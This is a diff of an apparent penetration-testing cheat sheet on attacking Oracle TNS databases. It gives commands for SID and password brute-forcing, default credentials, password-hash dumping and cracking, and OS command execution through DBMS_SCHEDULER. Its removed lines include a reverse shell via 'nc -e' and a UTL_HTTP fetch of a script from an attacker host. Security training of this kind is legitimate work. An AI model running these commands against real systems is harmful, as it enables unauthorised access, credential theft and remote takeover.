@@ -1,106 +1,82 @@
+# Oracle TNS (1521)
+
 !!! tip "Start here"
-    Enumerate SIDs first — you can't connect without one: `odat.py sidguesser -s <target>`. Once you have a SID, try default credentials: `SCOTT:tiger`, `SYS:oracle`, `SYSTEM:manager`. Connect with `sqlplus <user>/<pass>@<target>:1521/<SID>`.
+    Enumerate SIDs first — you can't connect without one: `odat.py sidguesser -s 10.10.10.10`. Once you have a SID, try default credentials: `SCOTT:tiger`, `SYS:oracle`, `SYSTEM:manager`. Connect with `sqlplus <user>/<pass>@10.10.10.10:1521/<SID>`.
+
+---
 
 ## Enumeration
-### Check for Open Oracle TNS Port
-```bash
-nmap -p 1521 --script oracle-tns-version,oracle-sid-brute,oracle-enum-users <target-ip>
-```
-## Enumerating Oracle SIDs
-Oracle databases use **SIDs (System Identifiers)** to differentiate instances. Knowing the **correct SID** is required for authentication.
-```bash
-odat.py sidguesser -s <target-ip>
-odat.py passwordguesser -s <target-ip> -d <SID>
-```
-https://github.com/quentinhardy/odat
 
-## Connecting to Oracle DB (SQLplus)
 ```bash
-sqlplus username/password@<target-ip>:1521/SID
+nmap -p 1521 --script oracle-tns-version,oracle-sid-brute 10.10.10.10
 ```
-### Common Credentials
+
+---
+
+## SID Enumeration
+
+```bash
+odat.py sidguesser -s 10.10.10.10
+odat.py passwordguesser -s 10.10.10.10 -d <SID>
 ```
+
+---
+
+## Authentication
+
+```bash
+sqlplus <user>/<pass>@10.10.10.10:1521/<SID>
+```
+
+Default credentials to try:
+
+```
+SCOTT:tiger
 SYS:oracle
 SYSTEM:manager
-SCOTT:tiger
 HR:hr
 DBSNMP:dbsnmp
 ```
-## Exploiting Misconfigurations
-If the **TNS Listener** is **unauthenticated**, attackers can:
 
-- **Retrieve database information**
-- **Modify database connections**
-- **Perform DoS attacks**
+---
 
-Check TNS Listener Status:
-```bash
-lsnrctl status
-```
-## PE in Oracle DBs
-Check for privilege escalation via PL/SQL injection or privilege misconfigurations once connected:
-Check privileges of the current user:
+## Post-Auth Enumeration
+
 ```sql
-SELECT * FROM session_privs;
+SELECT * FROM session_privs;                                      -- current privileges
+SELECT username, account_status FROM dba_users WHERE account_status='OPEN';
+SELECT * FROM dba_db_links;                                       -- linked databases
+SELECT name, password FROM sys.user$;                             -- password hashes
 ```
 
-Attempt privilege escalation (via SQL Injection in PL/SQL):
-```sql
-DECLARE
-  pragma autonomous_transaction;
-BEGIN
-  EXECUTE IMMEDIATE 'GRANT DBA TO username';
-END;
-```
+---
 
-If an account has DBA privileges:
-```sql
-BEGIN
-DBMS_SCHEDULER.CREATE_JOB (
-   job_name => 'shell_job',
-   job_type => 'EXECUTABLE',
-   job_action => '/bin/bash -c "nc -e /bin/bash <attacker-ip> <port>"',
-   enabled => TRUE);
-END;
-/
-```
-
-Start an NC listener and get a shell on that BB.
-### Exploiting UTL_HTTP for SSRF
-```sql
-SELECT UTL_HTTP.REQUEST('http://<attacker-ip>/malicious_script.sh') FROM dual;
-```
-
-## Password Hash Extraction (Oracle Hashes)
-```sql
-SELECT name, password FROM sys.user$;
-```
+## Hash Cracking
 
 ```bash
 hashcat -m 3100 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Remote Command Execution
-If Java is enabled (Oracle JVM), execute OS commands through Oracle DB:
+---
+
+## OS Command Execution (DBA Required)
+
+If the account has DBA privileges, schedule an OS command via DBMS_SCHEDULER:
+
 ```sql
-exec dbms_java.grant_permission('PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
+BEGIN
+  DBMS_SCHEDULER.CREATE_JOB(
+    job_name   => 'cmd_job',
+    job_type   => 'EXECUTABLE',
+    job_action => '/bin/bash',
+    number_of_arguments => 2,
+    enabled    => FALSE);
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 1, '-c');
+  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 2, 'id > /tmp/out.txt');
+  DBMS_SCHEDULER.ENABLE('cmd_job');
+END;
+/
 ```
 
-Use known Java methods to spawn OS commands for reverse shells or file manipulation.
-
-## Post-Exploitation & Lateral Movement
-### Enumerating Privileged Users
-```sql
-SELECT username, account_status FROM dba_users WHERE account_status='OPEN';
-```
-
-### Pivoting via Linked DBs
-If **DB links exist**, exploit them to access **remote databases**:
-```sql
-SELECT * FROM dba_db_links;
-```
-
-Execute commands on a linked DB:
-```sql
-EXEC ('SELECT * FROM users') AT [LINKED_DB];
-```
+!!! tip "Real-world"
+    Oracle is common in enterprise environments and often runs with overprivileged service accounts. SID enumeration is the critical first step — without the right SID, you can't authenticate at all. `SCOTT:tiger` is ancient but still shows up on legacy installations that were never hardened.
